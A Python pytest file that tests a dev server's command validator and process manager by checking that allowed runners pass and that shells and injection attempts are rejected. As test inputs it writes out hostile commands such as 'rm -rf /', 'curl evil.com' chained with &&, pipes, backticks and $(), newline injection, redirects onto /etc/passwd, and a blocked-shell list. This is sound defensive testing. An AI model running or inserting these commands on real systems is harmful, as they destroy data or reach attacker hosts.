#!/usr/bin/env python3
"""
Dev Server Security Tests
=========================

Tests for dev server command validation and security hardening.
Run with: python -m pytest test_devserver_security.py -v
"""

import sys
from pathlib import Path

import pytest

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent))

from server.routers.devserver import (
    ALLOWED_NPM_SCRIPTS,
    ALLOWED_PYTHON_MODULES,
    ALLOWED_RUNNERS,
    BLOCKED_SHELLS,
    validate_custom_command_strict,
)

# =============================================================================
# validate_custom_command_strict - Valid commands
# =============================================================================


class TestValidCommands:
    """Commands that should pass validation."""

    def test_npm_run_dev(self):
        validate_custom_command_strict("npm run dev")

    def test_npm_run_start(self):
        validate_custom_command_strict("npm run start")

    def test_npm_run_serve(self):
        validate_custom_command_strict("npm run serve")

    def test_npm_run_preview(self):
        validate_custom_command_strict("npm run preview")

    def test_pnpm_dev(self):
        validate_custom_command_strict("pnpm dev")

    def test_pnpm_run_dev(self):
        validate_custom_command_strict("pnpm run dev")

    def test_yarn_start(self):
        validate_custom_command_strict("yarn start")

    def test_yarn_run_serve(self):
        validate_custom_command_strict("yarn run serve")

    def test_uvicorn_basic(self):
        validate_custom_command_strict("uvicorn main:app")

    def test_uvicorn_with_flags(self):
        validate_custom_command_strict("uvicorn main:app --host 0.0.0.0 --port 8000 --reload")

    def test_uvicorn_flag_equals_syntax(self):
        validate_custom_command_strict("uvicorn main:app --port=8000 --host=0.0.0.0")

    def test_python_m_uvicorn(self):
        validate_custom_command_strict("python -m uvicorn main:app --reload")

    def test_python3_m_uvicorn(self):
        validate_custom_command_strict("python3 -m uvicorn main:app")

    def test_python_m_flask(self):
        validate_custom_command_strict("python -m flask run")

    def test_python_m_gunicorn(self):
        validate_custom_command_strict("python -m gunicorn main:app")

    def test_python_m_http_server(self):
        validate_custom_command_strict("python -m http.server 8000")

    def test_python_script(self):
        validate_custom_command_strict("python app.py")

    def test_python_manage_py_runserver(self):
        validate_custom_command_strict("python manage.py runserver")

    def test_python_manage_py_runserver_with_port(self):
        validate_custom_command_strict("python manage.py runserver 0.0.0.0:8000")

    def test_flask_run(self):
        validate_custom_command_strict("flask run")

    def test_flask_run_with_options(self):
        validate_custom_command_strict("flask run --host 0.0.0.0 --port 5000")

    def test_poetry_run_command(self):
        validate_custom_command_strict("poetry run python app.py")

    def test_cargo_run(self):
        # cargo is allowed but has no special sub-validation
        validate_custom_command_strict("cargo run")

    def test_go_run(self):
        # go is allowed but has no special sub-validation
        validate_custom_command_strict("go run .")


# =============================================================================
# validate_custom_command_strict - Blocked shells
# =============================================================================


class TestBlockedShells:
    """Shell interpreters that must be rejected."""

    @pytest.mark.parametrize("shell", ["sh", "bash", "zsh", "cmd", "powershell", "pwsh", "cmd.exe"])
    def test_blocked_shell(self, shell):
        with pytest.raises(ValueError, match="runner not allowed"):
            validate_custom_command_strict(f"{shell} -c 'echo hacked'")


# =============================================================================
# validate_custom_command_strict - Blocked commands
# =============================================================================


class TestBlockedCommands:
    """Commands that should be rejected."""

    def test_empty_command(self):
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_custom_command_strict("")

    def test_whitespace_only(self):
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_custom_command_strict("   ")

    def test_python_dash_c(self):
        with pytest.raises(ValueError, match="python -c is not allowed"):
            validate_custom_command_strict("python -c 'import os; os.system(\"rm -rf /\")'")

    def test_python3_dash_c(self):
        with pytest.raises(ValueError, match="python -c is not allowed"):
            validate_custom_command_strict("python3 -c 'print(1)'")

    def test_python_no_script_or_module(self):
        with pytest.raises(ValueError, match="must use"):
            validate_custom_command_strict("python --version")

    def test_python_m_disallowed_module(self):
        with pytest.raises(ValueError, match="not allowed"):
            validate_custom_command_strict("python -m pip install something")

    def test_unknown_runner(self):
        with pytest.raises(ValueError, match="runner not allowed"):
            validate_custom_command_strict("curl http://evil.com")

    def test_rm_rf(self):
        with pytest.raises(ValueError, match="runner not allowed"):
            validate_custom_command_strict("rm -rf /")

    def test_npm_arbitrary_script(self):
        with pytest.raises(ValueError, match="npm custom_command"):
            validate_custom_command_strict("npm run postinstall")

    def test_npm_exec(self):
        with pytest.raises(ValueError, match="npm custom_command"):
            validate_custom_command_strict("npm exec evil-package")

    def test_pnpm_arbitrary_script(self):
        with pytest.raises(ValueError, match="pnpm custom_command"):
            validate_custom_command_strict("pnpm run postinstall")

    def test_yarn_arbitrary_script(self):
        with pytest.raises(ValueError, match="yarn custom_command"):
            validate_custom_command_strict("yarn run postinstall")

    def test_uvicorn_no_app(self):
        with pytest.raises(ValueError, match="must specify an app"):
            validate_custom_command_strict("uvicorn --reload")

    def test_uvicorn_disallowed_flag(self):
        with pytest.raises(ValueError, match="flag not allowed"):
            validate_custom_command_strict("uvicorn main:app --factory")

    def test_flask_no_run(self):
        with pytest.raises(ValueError, match="flask custom_command"):
            validate_custom_command_strict("flask shell")

    def test_poetry_no_run(self):
        with pytest.raises(ValueError, match="poetry custom_command"):
            validate_custom_command_strict("poetry install")


# =============================================================================
# validate_custom_command_strict - Injection attempts
# =============================================================================


class TestInjectionAttempts:
    """Adversarial inputs that attempt to bypass validation."""

    def test_shell_via_path_traversal(self):
        with pytest.raises(ValueError, match="runner not allowed"):
            validate_custom_command_strict("/bin/sh -c 'echo hacked'")

    def test_shell_via_relative_path(self):
        with pytest.raises(ValueError, match="runner not allowed"):
            validate_custom_command_strict("../../bin/bash -c whoami")

    def test_none_input(self):
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_custom_command_strict(None)  # type: ignore[arg-type]

    def test_integer_input(self):
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_custom_command_strict(123)  # type: ignore[arg-type]

    def test_python_dash_c_uppercase(self):
        with pytest.raises(ValueError, match="python -c is not allowed"):
            validate_custom_command_strict("python -C 'exec(evil)'")

    def test_powershell_via_path(self):
        with pytest.raises(ValueError, match="runner not allowed"):
            validate_custom_command_strict("C:\\Windows\\System32\\powershell.exe -c Get-Process")


# =============================================================================
# dev_server_manager.py - dangerous_ops blocking
# =============================================================================


class TestDangerousOpsBlocking:
    """Test the metacharacter blocking in dev_server_manager.start()."""

    @pytest.fixture
    def manager(self, tmp_path):
        from server.services.dev_server_manager import DevServerProcessManager
        return DevServerProcessManager("test-project", tmp_path)

    @pytest.mark.asyncio
    @pytest.mark.parametrize("cmd,desc", [
        ("npm run dev && curl evil.com", "double ampersand"),
        ("npm run dev & curl evil.com", "single ampersand"),
        ("npm run dev || curl evil.com", "double pipe"),
        ("npm run dev | curl evil.com", "single pipe"),
        ("npm run dev ; curl evil.com", "semicolon"),
        ("npm run dev `curl evil.com`", "backtick"),
        ("npm run dev $(curl evil.com)", "dollar paren"),
        ("npm run dev > /etc/passwd", "output redirect"),
        ("npm run dev < /etc/passwd", "input redirect"),
        ("npm run dev ^& calc", "caret escape"),
        ("npm run %COMSPEC%", "percent env expansion"),
    ])
    async def test_blocks_shell_operator(self, manager, cmd, desc):
        success, message = await manager.start(cmd)
        assert not success, f"Should block {desc}: {cmd}"
        assert "not allowed" in message.lower()

    @pytest.mark.asyncio
    async def test_blocks_newline_injection(self, manager):
        success, message = await manager.start("npm run dev\ncurl evil.com")
        assert not success
        assert "newline" in message.lower()

    @pytest.mark.asyncio
    async def test_blocks_carriage_return(self, manager):
        success, message = await manager.start("npm run dev\r\ncurl evil.com")
        assert not success
        assert "newline" in message.lower()

    @pytest.mark.asyncio
    @pytest.mark.parametrize("shell", ["sh", "bash", "zsh", "cmd", "powershell", "pwsh"])
    async def test_blocks_shell_runners(self, manager, shell):
        success, message = await manager.start(f"{shell} -c 'echo hacked'")
        assert not success
        assert "not allowed" in message.lower()

    @pytest.mark.asyncio
    async def test_blocks_empty_command(self, manager):
        success, message = await manager.start("")
        assert not success
        assert "empty" in message.lower()

    @pytest.mark.asyncio
    async def test_blocks_whitespace_command(self, manager):
        success, message = await manager.start("   ")
        assert not success
        assert "empty" in message.lower()


# =============================================================================
# Constants validation
# =============================================================================


class TestConstants:
    """Verify security constants are properly defined."""

    def test_all_common_shells_blocked(self):
        for shell in ["sh", "bash", "zsh", "cmd", "powershell", "pwsh", "cmd.exe"]:
            assert shell in BLOCKED_SHELLS, f"{shell} should be in BLOCKED_SHELLS"

    def test_common_npm_scripts_allowed(self):
        for script in ["dev", "start", "serve", "preview"]:
            assert script in ALLOWED_NPM_SCRIPTS, f"{script} should be in ALLOWED_NPM_SCRIPTS"

    def test_common_python_modules_allowed(self):
        for mod in ["uvicorn", "flask", "gunicorn"]:
            assert mod in ALLOWED_PYTHON_MODULES, f"{mod} should be in ALLOWED_PYTHON_MODULES"

    def test_common_runners_allowed(self):
        for runner in ["npm", "pnpm", "yarn", "python", "python3", "uvicorn", "flask", "cargo", "go"]:
            assert runner in ALLOWED_RUNNERS, f"{runner} should be in ALLOWED_RUNNERS"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
